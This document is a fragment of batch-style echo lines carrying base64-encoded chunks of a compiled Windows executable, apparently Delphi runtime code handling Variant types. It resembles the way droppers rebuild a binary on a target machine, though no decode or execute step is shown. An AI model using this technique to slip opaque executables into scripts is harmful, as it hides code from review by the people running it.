echo h0EAD4VKAQAAuJSHQQDo+fz//+hg+P//6Hfs//+4TEJBALkWAAAAixXsn0AA6MqK
echo //+4FEJBALkHAAAAixVsn0AA6LWK//+4LEFBALkCAAAAixUAEEAA6KCK//+4JEFB
echo AOhegf//uISHQQCLFVxmQADomo///7iAh0EAixU4ZkAA6IqP//+4SIdBALkHAAAA
echo ixUAEEAA6GGK//+4HIdBALkHAAAAixUAEEAA6EyK//+4AIdBALkHAAAAixUAEEAA
echo 6DeK//+40IZBALkMAAAAixUAEEAA6CKK//+4oIZBALkMAAAAixUAEEAA6A2K//+4
echo nIZBAOjLgP//uJiGQQDowYD//7iUhkEA6LeA//+4kIZBAOitgP//uIiGQQDoo4D/
echo /7iEhkEA6JmA//+4eIZBAOiPgP//uMxAQQDohYD//7i4QEEA6NuG//+4tEBBAOhx
echo gP//M8BaWVlkiRBo6LlAAMPphnr//+v4XcOLwFWL7DPAVWhUukAAZP8wZIkggy2I
echo h0EAAXNAuJy1QADo4H3//7iItkAA6P59//+APV2GQQAAdA+4JEFBALpoukAA6GaA
echo ///oWer//+hY6///6Nf2///ohvL//zPAWllZZIkQaFu6QADD6RN6///r+F3DAAAA
echo /////wIAAAAweAAA/yXkwkEAi8BVi+wzwFVombpAAGT/MGSJIP8FmIdBADPAWllZ
echo ZIkQaKC6QADD6c55///r+F3Di8CDLZiHQQABw1WL7DPAVWjRukAAZP8wZIkg/wWc
echo h0EAM8BaWVlkiRBo2LpAAMPplnn//+v4XcOLwIMtnIdBAAHD/yUIw0EAi8D/JQTD
echo QQCLwP8lAMNBAIvA/yX8wkEAi8BVi+yBfRAABAAAdAe4AUAAgOsXZotFGFBmi0UU
echo UItFDFCLRQhQ6M7///9dwhQAi8BVi+y4AUAAgF3CCABVi+y4AUAAgF3CDABVi+y4
echo AUAAgF3CEABVi+xqAFMzwFVosrtAAGT/MGSJIIF9DAAEAAB0B7sBQACA6yCNRfyL
echo VQjoRYH//4tF/ItVFOgSsP//g+B/ixyFBENBADPAWllZZIkQaLm7QACNRfzok37/
echo /8PptXj//+vwi8NbWV3CEACNQABVi+xqAFMzwFVoHrxAAGT/MGSJIIF9DAAEAAB0
echo B7sBQACA6yCNRfyLVQjo2YD//4tF/ItVFOgqwf//g+B/ixyFBENBADPAWllZZIkQ
echo aCW8QACNRfzoJ37//8PpSXj//+vwi8NbWV3CEACNQABVi+xqAFMzwFVoirxAAGT/
echo MGSJIIF9DAAEAAB0B7sBQACA6yCNRfyLVQjobYD//4tF/ItVFOiSwP//g+B/ixyF
echo BENBADPAWllZZIkQaJG8QACNRfzou33//8Pp3Xf//+vwi8NbWV3CEACNQABVi+xq
echo AFMzwFVo9rxAAGT/MGSJIIF9DAAEAAB0B7sBQACA6yCNRfyLVQjoAYD//4tF/ItV
echo FOhq2P//g+B/ixyFBENBADPAWllZZIkQaP28QACNRfzoT33//8PpcXf//+vwi8Nb
echo WV3CEACNQABVi+xqAFMzwFVoYr1AAGT/MGSJIIF9DAAEAAB0B7sBQACA6yCNRfyL
echo VQjolX///4tF/ItVFOgSwP//g+B/ixyFBENBADPAWllZZIkQaGm9QACNRfzo43z/
echo /8PpBXf//+vwi8NbWV3CEACNQABVi+yDxPhTM8CJRfgzwFVo4b1AAGT/MGSJIIF9
echo DAAEAAB0B7sBQACA6y2NRfiLVQjoI3///4tF+I1V/+jcrv//g+B/ixyFBENBAIB9
echo /wH1G8CLVRRmiQIzwFpZWWSJEGjovUAAjUX46GR8///D6YZ2///r8IvDW1lZXcIQ
echo AI1AAFWL7GoAU4tFGIXAdAQz0okQM8BVaFS+QABk/zBkiSCBfRAABAAAdAe7AUAA
echo gOsb/3UM/3UIjUX86H++//+LVfyLRRjotIP//zPbM8BaWVlkiRBoW75AAI1F/Ojx
echo e///w+kTdv//6/CLw1tZXcIUAJBVi+xqAFOLRRiFwHQEM9KJEDPAVWjEvkAAZP8w
echo ZIkggX0QAAQAAHQHuwFAAIDrG/91DP91CI1F/Ohfzv//i1X8i0UY6ESD//8z2zPA
echo WllZZIkQaMu+QACNRfzogXv//8Ppo3X//+vwi8NbWV3CFACQVYvsagBTi0UUhcB0
echo BDPSiRAzwFVoOL9AAGT/MGSJIIF9DAAEAAB0B7sBQACA6x9mg30IARvAQI1N/DPS
echo 6Beu//+LVfyLRRTo0IL//zPbM8BaWVlkiRBoP79AAI1F/OgNe///w+kvdf//6/CL
echo w1tZXcIQAJD/JfjCQQCLwP8l9MJBAIvA/yXwwkEAi8D/JezCQQCLwFWL7FOL2ovT
echo i00Ig3n8AHQVUItFCItA/FDoopj//4vQhdJ1AovTi8JbXcOQVYvsUWiMwUAA6H6Y
echo //+JRfxVugS7QAC4nMFAAOiz////WaOgh0EAVbo0u0AAuLDBQADonf///1mjpIdB
echo AFW6NLtAALi4wUAA6If///9Zo6iHQQBVukC7QAC4wMFAAOhx////WaOsh0EAVbpA
echo u0AAuMjBQADoW////1mjsIdBAFW6QLtAALjQwUAA6EX///9Zo7SHQQBVukC7QAC4
echo 2MFAAOgv////WaO4h0EAVbpAu0AAuODBQADoGf///1mjvIdBAFW6QLtAALjowUAA
echo 6AP///9Zo8CHQQBVukC7QAC48MFAAOjt/v//WaPEh0EAVbpAu0AAuPjBQADo1/7/
echo /1mjyIdBAFW6QLtAALgAwkAA6MH+//9Zo8yHQQBVuky7QAC4CMJAAOir/v//WaPQ
echo h0EAVbpYu0AAuBDCQADolf7//1mj1IdBAFW6xLtAALggwkAA6H/+//9Zo9iHQQBV
echo ujC8QAC4MMJAAOhp/v//WaPch0EAVbqcvEAAuEDCQADoU/7//1mj4IdBAFW6CL1A
echo ALhQwkAA6D3+//9Zo+SHQQBVunS9QAC4YMJAAOgn/v//WaPoh0EAVbr0vUAAuHDC
echo QADoEf7//1mj7IdBAFW6ZL5AALiAwkAA6Pv9//9Zo/CHQQBVutS+QAC4kMJAAOjl
echo /f//WaP0h0EAWV3Db2xlYXV0MzIuZGxsAAAAAFZhcmlhbnRDaGFuZ2VUeXBlRXgA
echo VmFyTmVnAABWYXJOb3QAAFZhckFkZAAAVmFyU3ViAABWYXJNdWwAAFZhckRpdgAA
echo VmFySWRpdgBWYXJNb2QAAFZhckFuZAAAVmFyT3IAAABWYXJYb3IAAFZhckNtcAAA
echo VmFySTRGcm9tU3RyAAAAAFZhclI0RnJvbVN0cgAAAABWYXJSOEZyb21TdHIAAAAA
echo VmFyRGF0ZUZyb21TdHIAAFZhckN5RnJvbVN0cgAAAABWYXJCb29sRnJvbVN0cgAA
echo VmFyQnN0ckZyb21DeQAAAFZhckJzdHJGcm9tRGF0ZQBWYXJCc3RyRnJvbUJvb2wA
echo VYvsM8BVaMXCQABk/zBkiSD/BfiHQQAzwFpZWWSJEGjMwkAAw+micf//6/hdw4vA
echo gy34h0EAAXMF6Lb8///DkMyDRCQE+ItEJASLAP8gg0QkBPjp3CUAAINEJAT46d4l
echo AADhwkAA7sJAAPjCQAABAAAAAAAAAAAAAADAAAAAAAAARgLDQAAIAAAAAAAAAIvA
echo fMNAAA7DQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC4w0AADAAAAAwQQACcMUAA
echo qDFAAKwxQACwMUAApDFAACgvQABEL0AA6OdAAOzoQAB46EAArOhAAIzoQADI6EAA
echo dOhAAOjmQAAg50AArOdAADwpQAA8KUAA3OZAAMDoQAB050AAaOdAABJUQ3VzdG9t
echo VmFyaWFudFR5cGWQ0MNAAAcSVEN1c3RvbVZhcmlhbnRUeXBlfMNAAGAQQAAAAAhW
echo YXJpYW50cwAAjUAASMRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIxEAA
echo DAAAAAxkQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AAgC9AABZFVmFyaWFu
echo dEludmFsaWRPcEVycm9ykKzEQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo rMRAAAwAAAAMZEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAAVRVZh
echo cmlhbnRUeXBlQ2FzdEVycm9yi8AQxUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAABDFQAAMAAAADGRAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AA
echo FUVWYXJpYW50T3ZlcmZsb3dFcnJvcovAdMVAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAB0xUAADAAAAAxkQACcMUAAqDFAAKwxQACwMUAApDFAACgvQABEL0AA
echo gC9AABdFVmFyaWFudEludmFsaWRBcmdFcnJvctjFQAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAA2MVAAAwAAAAMZEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AA
echo RC9AAIAvQAAXRVZhcmlhbnRCYWRWYXJUeXBlRXJyb3I8xkAAAAAAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAADzGQAAMAAAADGRAAJwxQACoMUAArDFAALAxQACkMUAA
echo KC9AAEQvQACAL0AAFUVWYXJpYW50QmFkSW5kZXhFcnJvcovAoMZAAAAAAAAAAAAA
echo AAAAAAAAAAAAAAAAAAAAAAAAAACgxkAADAAAAAxkQACcMUAAqDFAAKwxQACwMUAA
echo pDFAACgvQABEL0AAgC9AABhFVmFyaWFudEFycmF5TG9ja2VkRXJyb3KNQAAIx0AA
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAjHQAAMAAAADGRAAJwxQACoMUAA
echo rDFAALAxQACkMUAAKC9AAEQvQACAL0AAGEVWYXJpYW50QXJyYXlDcmVhdGVFcnJv
echo co1AAHDHQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcMdAAAwAAAAMZEAA
echo nDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAAURVZhcmlhbnROb3RJbXBs
echo RXJyb3KNQADUx0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANTHQAAMAAAA
echo DGRAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AAGEVWYXJpYW50T3V0
echo T2ZNZW1vcnlFcnJvco1AADzIQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo PMhAAAwAAAAMZEAAnDFAAKgxQACsMUAAsDFAAKQxQAAoL0AARC9AAIAvQAAXRVZh
echo cmlhbnRVbmV4cGVjdGVkRXJyb3KgyEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo AAAAAKDIQAAMAAAADGRAAJwxQACoMUAArDFAALAxQACkMUAAKC9AAEQvQACAL0AA
echo FUVWYXJpYW50RGlzcGF0Y2hFcnJvcovAVYvsagAzwFVoAslAAGT/MGSJII1V/KGo
echo dEEA6OSK//+LTfyyAaFgxEAA6O3U///ouGv//zPAWllZZIkQaAnJQACNRfzoQ3H/
echo /8PpZWv//+vwWV3DVYvsg8TkU1YzyYlN7IlN6IlN5Ivyi9gzwFVom8lAAGT/MGSJ
echo II1V7IvD6H0bAACLReyJRfDGRfQLjVXoi8boaRsAAItF6IlF+MZF/AuNRfBQagGN
echo VeShuHNBAOhQiv//i03ksgGhYMRAAOiV1P//6CRr//8zwFpZWWSJEGiiyUAAjUXk
echo ugMAAADoznD//8PpzGr//+vrXluL5V3DVYvsagAzwFVo8slAAGT/MGSJII1V/KGM
echo dEEA6PSJ//+LTfyyAaH8w0AA6P3T///oyGr//zPAWllZZIkQaPnJQACNRfzoU3D/
echo /8PpdWr//+vwWV3DVYvsg8TkU1YzyYlN7IlN6IlN5Ivyi9gzwFVoi8pAAGT/MGSJ
echo II1V7IvD6I0aAACLReyJRfDGRfQLjVXoi8boeRoAAItF6IlF+MZF/AuNRfBQagGN
echo VeSh6HRBAOhgif//i03ksgGhxMRAAOil0///6DRq//8zwFpZWWSJEGiSykAAjUXk
echo ugMAAADo3m///8Pp3Gn//+vrXluL5V3DVYvsagAzwFVo4spAAGT/MGSJII1V/KFs
echo dEEA6ASJ//+LTfyyAaG8xkAA6A3T///o2Gn//zPAWllZZIkQaOnKQACNRfzoY2//
echo /8PphWn//+vwWV3DVYvsuQgAAABqAGoASXX5U4vYM8BVaDHNQABk/zBkiSCLwz0K
echo AAKAfzkPhJoAAAA9BQACgH8ddFctAUAAgA+E+AAAAC3+vwAAD4RcAQAA6XoBAAAt
echo CAACgHQ/SHRi6WsBAAAtCwACgA+EggAAAIPoAg+EnwAAAC0BAAUAD4TgAAAAg+hJ
echo D4T9AAAA6T4BAADoOP3//+mEAQAAjVX8oVR1QQDoKoj//4tN/LIBoYzFQADoM9L/
echo /+j+aP//6V4BAADo+P3//+lUAQAAjVX4ofBzQQDo+of//4tN+LIBocTEQADoA9L/
echo /+jOaP//6S4BAACNVfShHHVBAOjUh///i030sgGh8MVAAOjd0f//6Kho///pCAEA
echo AI1V8KGAdUEA6K6H//+LTfCyAaFUxkAA6LfR///ogmj//+niAAAAjVXsocR0QQDo
echo iIf//4tN7LIBoSTHQADokdH//+hcaP//6bwAAACNVeihFHRBAOhih///i03osgGh
echo iMdAAOhr0f//6DZo///plgAAAI1V5KEodEEA6DyH//+LTeSyAaEoxUAA6EXR///o
echo EGj//+tzjVXgoexzQQDoGYf//4tN4LIBofDHQADoItH//+jtZ///61ChYHVBAIsA
echo iUXIxkXMC4ld0MZF1ACNVcSLw+j0yP//i0XEiUXYxkXcC41FyFBqAo1VwKFwdEEA
echo 6MeG//+LTcCyAaEMZEAA6AzR///om2f//zPAWllZZIkQaDjNQACNRcC6AgAAAOhF
echo bf//jUXguggAAADoOG3//8PpNmf//+veW4vlXcONQACFwHQF6KP9///Di8BThcB0
echo LIvYgesFAAKAdAeD6wV0DesWi8KL0eih+///6xCLwovR6Ib8///rBehv/f//W8OQ
echo VYvsagAzwFVoys1AAGT/MGSJII1V/KGwc0EA6ByG//+LTfyyAaFUyEAA6CXQ///o
echo 8Gb//zPAWllZZIkQaNHNQACNRfzoe2z//8PpnWb//+vwWV3DVYvsU4tNCIHBAP3/
echo /4tUwQQDFMGLXQg7lIMA////D5/CSITSdASFwH3ji8JbXcOQVYvsU1ayAYtNCP+E
echo gQD///+LTQiLjMEE/f//i9mLdQgDnMYA/f//i3UIO5yGAP///38ihcB1BDPS6xqL
echo VQiLVQiJjIIA////i1UIUkjorv///1mL0IvCXltdw5BVi+yBxOj8//9TVleJhfz8
echo //+Lhfz8///2QAEgdQq4VwAHgOi4/v//i4X8/P//ZosAi9BmgeL/D2aD+gwPhSIB
echo AACLlfz8///2xEB0E4uF/Pz//4tACIsAiYX4/P//6w+Lhfz8//+LQAiJhfj8//+L
echo hfj8//8PtwCJhfD8//+LnfD8//9Lhdt8a0Mz/421AP3//4vGiYXo/P//i4Xo/P//
echo g8AEUI1HAVCLhfj8//9Q6Dzw///oJ/7//42F9Pz//1CNRwFQi4X4/P//UOgo8P//
echo 6Av+//+Lhej8//+LlfT8//8rUARCi4Xo/P//iRBHg8YIS3Wei53w/P//S4XbfBpD
echo jYUE/f//jZUA////iwiJCoPCBIPACEt181WLnfD8//9Li8PoTP7//1mEwHQqjYXs
echo /P//UI2FAP///1CLhfj8//9Q6Lnv///olP3//4uF7Pz//+ihAAAAVYvD6EX+//9Z
echo hMB1tYuF/Pz//1DoHOv//+hr/f//X15bi+Vdw1NWUYvYZoszZoP+FHMNU+j86v//
echo 6Ev9///rW2aB/gABdQ9mxwMAAI1DCOg5av//60Vmgf4BAXUKi8P/FRCIQQDrNGb3
echo xgAgdAmLw+g0/v//6ySL1IvG6N0YAACEwHQMi9OLBCSLCP9RJOsLU+if6v//6O78
echo //9aXlvDi8Bm9wDov3UGZscAAADD6HL////DkFDo5v///1jDVYvsU4tNCIHBAP3/
echo /4tUwQQDFMGLXQg7lIMA////D5/CSITSdASFwH3ji8JbXcOQVYvsU1ayAYtNCP+E
echo gQD///+LTQiLjMEE/f//i9mLdQgDnMYA/f//i3UIO5yGAP///38ihcB1BDPS6xqL
echo VQiLVQiJjIIA////i1UIUkjorv///1mL0IvCXltdw5BVi+yBxOD8//9TVleJjfj8
echo //+L2omF/Pz///ZDASB1CrhXAAeA6Bb8//9miwOL0GaB4v8PZoP6DA+FcwEAAPbE
echo QHQNi0MIiwCJhez8///rCYtDCImF7Pz//4uF7Pz//w+3AImF8Pz//4ud8Pz//0uF
echo 23xrQzP/jbUA/f//i8aJheD8//+LheD8//+DwARQjUcBUIuF7Pz//1Dosu3//+id
echo +///jYX0/P//UI1HAVCLhez8//9Q6J7t///ogfv//4uF4Pz//4uV9Pz//ytQBEKL
echo heD8//+JEEeDxghLdZ6NhQD9//9Qi4Xw/P//UGoM6FXt//+L8IX2dQXomvj//4uF
echo /Pz//+hP/v//i4X8/P//ZscADCCLhfz8//+JcAiLnfD8//9Lhdt8GkONhQT9//+N
echo lQD///+LCIkKg8IEg8AIS3XzVYud8Pz//0uLw+gj/v//WYTAdEyNhej8//9QjYUA
echo ////UIuF7Pz//1Do8Oz//+jL+v//jYXk/P//UI2FAP///1BW6Nfs///osvr//4uF
echo 6Pz//4vQi4Xk/P///5X4/P//VYvD6Pr9//9ZhMB1k+sSU4uF/Pz//1DoNuj//+h9
echo +v//X15bi+Vdw4vA6K8AAADDi8BTVldRi/KL2Gb3A+i/dAeLw+jy/P//Zos+ZoP/
echo FHMOVlPo+uf//+hB+v//63lmgf8AAXUXZscDAAEzwIlDCI1DCItWCOh7Z///61tm
echo gf8BAXUTZok7i0YIiUMIi8P/FRiIQQDrQWb3xwAgdBC5zNJAAIvWi8Posv3//+sq
echo i9SLx+i7FQAAhMB0EWoAi86L04tEJASLGP9TKOsMVlPof+f//+jG+f//Wl9eW8OQ
echo U1aL2ovwO/N0Nmb3A+i/dSZm9wbov3QHi8boPfz//4sDiQaLQwSJRgSLQwiJRgiL
echo QwyJRgzrCYvTi8boFP///15bw5BVi+xTi9iLw+jTbP//UGoAaAAEAAD/dQz/dQih
echo 9HNBAIsA/9BmuQgAZroGAOhX+f//W13CCACLwFWL7FOL2IvD6Jts//9QagBoAAQA
echo AP91DP91CKGYdEEAiwD/0Ga5CABmugcA6B/5//9bXcIIAIvAVYvsM8lRUVFRU1aL
echo 2ovwM8BVaOrUQABk/zBkiSCLw+hMbP//UGoAaAAEAABWoSB1QQCLAP/QZrkIAGa6
echo CwDo1fj//6AUQ0EALAFyT3QG/sh0I+tCjUX4ixPoOmj//4tF+I1V/Ojbk///i1X8
echo i8PoSW3//+smjUXwixPoGWj//4tF8I1V9Oh+k///i1X0i8PoKG3//+sF6Nn0//8z
echo wFpZWWSJEGjx1EAAjUXwugQAAADof2X//8PpfV///+vrXluL5V3DkFWL7IPE6FNW
echo M8mJTeyJTeiL8ovYM8BVaLfVQABk/zBkiSCNRfBQ6MHl//8zwFVoldVAAGT/MGSJ
echo IGoIagBoAAQAAFONRfBQoSx1QQCLAP/QZosTZrkAAej49///jUXsUI1F6ItV+OhR
echo bP//i0Xouf///3+6AQAAAOgrbf//i1Xsi8boTWf//zPAWllZZIkQaJzVQACNRfDo
echo xPr//8Pp0l7//+vwM8BaWVlkiRBovtVAAI1F6LoCAAAA6AZr///D6bBe///r615b
echo i+Vdw1WL7IPE8FNWi/KL2I1F8FDoC+X//zPAVWga1kAAZP8wZIkgi9ONRfDoj/3/
echo /41F8P8VFIhBAI1V8IvG6KgAAAAzwFpZWWSJEGgh1kAAjUXw6D/6///D6U1e///r
echo 8F5bi+Vdw5BVi+yDxORTiVX8i9iLRfyFwHQEM9KJEI1V9GaLA+jKEgAAiEX7gH37
echo AHRRjUXkUOiI5P//M8BVaJ3WQABk/zBkiSBoAAEAAIvLjVXki0X0ixj/UxyLRfyL
echo VezoEWT//zPAWllZZIkQaKTWQACNReTovPn//8Ppyl3//+vwikX7W4vlXcNVi+y5
echo DwAAAGoAagBJdflTVovai/AzwFVo49tAAGT/MGSJIGaLAw+30IP6FA+HQgIAAP8k
echo leXWQAA510AARddAAG3XQACI10AAotdAAMPXQADk10AAAdhAAB7YQAAH2UAAINlA
echo AE7YQAD22EAAB9lAACDZQAAg2UAAadhAAITYQACg2EAAu9hAANnYQACLxugEY///
echo 6U8EAACAPQxDQQAAdA1mugABZrgBAOix8f//i8aLFRBDQQDoMGP//+knBAAAjVX8
echo D79DCOjXkv//i1X8i8boFWP//+kMBAAAjVX4i0MI6L2S//+LVfiLxuj7Yv//6fID
echo AADZQwiDxPTbPCSbjUX06Myk//+LVfSLxujaYv//6dEDAADdQwiDxPTbPCSbjUXw
echo 6Kuk//+LVfCLxui5Yv//6bADAAD/cwz/cwiNRezo0vv//4tV7IvG6NBk///pkwMA
echo AP9zDP9zCI1F6Ojt+///i1Xoi8bos2T//+l2AwAAjUXkUI1F4ItTCOiHaf//i0Xg
echo uf///3+6AQAAAOhhav//i1Xki8bog2T//+lGAwAAjVXcZotDCOja+///i1Xci8bo
echo aGT//+krAwAAjVXYD75DCOjbkf//i1XYi8boGWL//+kQAwAAjVXUM8CKQwjov5H/
echo /4tV1IvG6P1h///p9AIAAI1V0A+3QwjopJH//4tV0IvG6OJh///p2QIAAItDCDPS
echo UlCNRczocpL//4tVzIvG6MRh///puwIAAP9zDP9zCI1FyOhVkv//i1XIi8bop2H/
echo /+meAgAAi0MIi9CLxuiq/f//6Y0CAACNVcSLw+jn+///i1XEi8bofWH//+l0AgAA
echo i9BmgeoAAXQHZv/KdBHrKIvGi1MI6F5h///pVQIAAI1VwIvD6Hv8//+LVcCLxuhF
echo Yf//6TwCAAD2xEAPhAsCAAAPt8Al/7///4P4FA+H5AEAAP8khXnZQABW20AAVttA
echo AM3ZQADq2UAABtpAACnaQABM2kAAa9pAAIraQABW20AAVttAAJvaQABI20AAVttA
echo AFbbQABW20AAuNpAANXaQADy2kAAD9tAACzbQACNVbyLQwgPvwDodZD//4tVvIvG
echo 6LNg///pqgEAAI1VuItDCIsA6FmQ//+LVbiLxuiXYP//6Y4BAACLQwjZAIPE9Ns8
echo JJuNRbToZqL//4tVtIvG6HRg///pawEAAItDCN0Ag8T02zwkm41FsOhDov//i1Ww
echo i8boUWD//+lIAQAAi0MI/3AE/zCNRazoaPn//4tVrIvG6GZi///pKQEAAItDCP9w
echo BP8wjUWo6IH5//+LVaiLxuhHYv//6QoBAACLxotTCIsS6NZh///p+QAAAI1VpItD
echo CGaLAOiL+f//i1Wki8boGWL//+ncAAAAjVWgi0MID74A6IqP//+LVaCLxujIX///
echo 6b8AAACNVZyLQwgPtgDobY///4tVnIvG6Ktf///pogAAAI1VmItDCA+3AOhQj///
echo i1WYi8bojl///+mFAAAAi0MIiwAz0lJQjUWU6ByQ//+LVZSLxuhuX///62iLQwj/
echo cAT/MI1FkOgAkP//i1WQi8boUl///+tMi0MIi9CLxuhY+///6z6NVYyLw+iY+f//
echo i1WMi8boLl///+soi8bo0V7//4vQi8PorPr//4TAdRSNVYiLw+hu+f//i1WIi8bo
echo BF///zPAWllZZIkQaOrbQACNRYi6BwAAAOi6Xv//jUWkugMAAADoAWX//41FsLoL
echo AAAA6KBe//+NRdy6BQAAAOjnZP//jUXwugQAAADohl7//8PphFj//+u3XluL5V3D
echo VYvsg8TsU1YzyYlN7Ivyi9gzwFVomtxAAGT/MGSJII1F8FDozN7//zPAVWh93EAA
echo ZP8wZIkgaghqAGgABAAAU41F8FChLHVBAIsA/9BmixNmuQgA6APx//9WjUXsi1X4
echo 6F9l//+LRey5////f7oBAAAA6Dlm//8zwFpZWWSJEGiE3EAAjUXw6Nzz///D6epX
echo ///r8DPAWllZZIkQaKHcQACNRezoC2T//8PpzVf//+vwXluL5V3DkFWL7IPE8FNW
echo i/KL2I1F8FDoJ97//zPAVWj+3EAAZP8wZIkgi9ONRfDoq/b//41F8P8VFIhBAI1V
echo 8IvG6OwAAAAzwFpZWWSJEGgF3UAAjUXw6Fvz///D6WlX///r8F5bi+Vdw5BVi+yD
echo xOBTM8mJTeCJVfyL2ItF/IXAdAQz0okQM8BVaMTdQABk/zBkiSCNVfRmiwPo0wsA
echo AIhF+4B9+wB0ZI1F5FDokd3//zPAVWin3UAAZP8wZIkgagiLy41V5ItF9IsY/1Mc
echo i0X8UI1F4ItV7Og1ZP//i0Xguf///3+6AQAAAOgPZf//M8BaWVlkiRBort1AAI1F
echo 5Oiy8v//w+nAVv//6/AzwFpZWWSJEGjL3UAAjUXg6OFi///D6aNW///r8IpF+1uL
echo 5V3DkFWL7LkOAAAAagBqAEl1+VFTVovai/AzwFVoJuNAAGT/MGSJIGaLAw+30IP6
echo FA+HNQIAAP8klQ7eQABi3kAAbt5AAJbeQACx3kAAy95AAOzeQAAN30AAKt9AAEff
echo QAAj4EAAPOBAAGrfQAAS4EAAI+BAADzgQAA84EAAhd9AAKDfQAC830AA199AAPXf
echo QACLxug7Yv//6UIEAACAPQxDQQAAdA1muggAZrgBAOiI6v//i8aLFRBDQQDoX2P/
echo /+kaBAAAjVX8D79DCOiui///i1X8i8boRGP//+n/AwAAjVX4i0MI6JSL//+LVfiL
echo xugqY///6eUDAADZQwiDxPTbPCSbjUX06KOd//+LVfSLxugJY///6cQDAADdQwiD
echo xPTbPCSbjUXw6IKd//+LVfCLxujoYv//6aMDAAD/cwz/cwiNRezoqfT//4tV7IvG
echo 6Lth///phgMAAP9zDP9zCI1F6OjE9P//i1Xoi8bonmH//+lpAwAAVo1F5ItTCOhh
echo Yv//i0Xkuf///3+6AQAAAOg7Y///6UYDAACNVeBmi0MI6L70//+LVeCLxuhgYf//
echo 6SsDAACNVdwPvkMI6L+K//+LVdyLxuhVYv//6RADAACNVdgzwIpDCOijiv//i1XY
echo i8boOWL//+n0AgAAjVXUD7dDCOiIiv//i1XUi8boHmL//+nZAgAAi0MIM9JSUI1F
echo 0OhWi///i1XQi8boAGL//+m7AgAA/3MM/3MIjUXM6DmL//+LVcyLxujjYf//6Z4C
echo AACLQwiL0IvG6Lb9///pjQIAAI1VyIvD6MP7//+LVciLxuipYP//6XQCAACL0GaB
echo 6gABdAdm/8p0Eesoi8aLUwjommH//+lVAgAAjVXEi8PoQ/z//4tVxIvG6HFg///p
echo PAIAAPbEQA+ECwIAAA+3wCX/v///g/gUD4fkAQAA/ySFleBAAHLiQABy4kAA6eBA
echo AAbhQAAi4UAAReFAAGjhQACH4UAApuFAAHLiQABy4kAAt+FAAGTiQABy4kAAcuJA
echo AHLiQADU4UAA8eFAAA7iQAAr4kAASOJAAI1VwItDCA+/AOhZif//i1XAi8bo72D/
echo /+mqAQAAjVW8i0MIiwDoPYn//4tVvIvG6NNg///pjgEAAItDCNkAg8T02zwkm41F
echo uOhKm///i1W4i8bosGD//+lrAQAAi0MI3QCDxPTbPCSbjUW06Ceb//+LVbSLxuiN
echo YP//6UgBAACLQwj/cAT/MI1FsOhM8v//i1Wwi8boXl///+kpAQAAi0MI/3AE/zCN
echo RazoZfL//4tVrIvG6D9f///pCgEAAIvGi1MIixLoAmD//+n5AAAAjVWoi0MIZosA
echo 6G/y//+LVaiLxugRX///6dwAAACNVaSLQwgPvgDoboj//4tVpIvG6ARg///pvwAA
echo AI1VoItDCA+2AOhRiP//i1Wgi8bo51///+miAAAAjVWci0MID7cA6DSI//+LVZyL
echo xujKX///6YUAAACLQwiLADPSUlCNRZjoAIn//4tVmIvG6Kpf///raItDCP9wBP8w
echo jUWU6OSI//+LVZSLxuiOX///60yLQwiL0IvG6GT7///rPo1VkIvD6HT5//+LVZCL
echo xuhaXv//6yiLxugVXv//i9CLw+h0+v//hMB1FI1VjIvD6Er5//+LVYyLxugwXv//
echo M8BaWVlkiRBoLeNAAI1FjLoCAAAA6PJd//+NRZS6BQAAAOiRV///jUWougMAAADo
echo 2F3//41FtLoEAAAA6HdX//+NRcS6AgAAAOi+Xf//jUXMugUAAADoXVf//41F4LoE
echo AAAA6KRd//+NRfC6BAAAAOhDV///w+lBUf//65BeW4vlXcOQZoM4CHIa/3AM/3AI
echo /3AE/zBmxwAAAIni6C/w//+DxBDDjUAA/////wUAAABFbXB0eQAAAP////8EAAAA
echo TnVsbAAAAAD/////CAAAAFNtYWxsaW50AAAAAP////8HAAAASW50ZWdlcgD/////
echo BgAAAFNpbmdsZQAA/////wYAAABEb3VibGUAAP////8IAAAAQ3VycmVuY3kAAAAA
echo /////wQAAABEYXRlAAAAAP////8GAAAAT2xlU3RyAAD/////CAAAAERpc3BhdGNo
echo AAAAAP////8FAAAARXJyb3IAAAD/////BwAAAEJvb2xlYW4A/////wcAAABWYXJp
echo YW50AP////8HAAAAVW5rbm93bgD/////BwAAAERlY2ltYWwA/////wMAAAAkMEYA
echo /////wgAAABTaG9ydEludAAAAAD/////BAAAAEJ5dGUAAAAA/////wQAAABXb3Jk
echo AAAAAP////8IAAAATG9uZ1dvcmQAAAAA/////wUAAABJbnQ2NAAAAFWL7IHE+P3/
echo /1NWVzPJiY34/f//i/KL2DPAVWje5UAAZP8wZIkgi/tmgef/D2aD/xR3FovGD7fX
echo ixSVHENBAOicVf//6Z4AAABmgfsAAXURi8a69OVAAOiEVf//6YYAAABmgfsBAXUO
echo i8a6BOZAAOhsVf//63GNVfyLw+jcAwAAhMB0O42F/P7//1CNlfz9//+LRfyLAOi1
echo Sf//jYX8/f//uf///3+6AgAAAOjkQf//jZX8/v//i8boM1f//+sojY34/f//D7fH
echo ugQAAADo2oX//4uN+P3//4sVYHVBAIsSi8bojVf///bHIHQOiw6LxroQ5kAA6HpX
echo ///2x0B0DosOi8a6IOZAAOhnV///M8BaWVlkiRBo5eVAAI2F+P3//+hnVP//w+mJ
echo Tv//6+1fXluL5V3D/////wYAAABTdHJpbmcAAP////8DAAAAQW55AP////8GAAAA
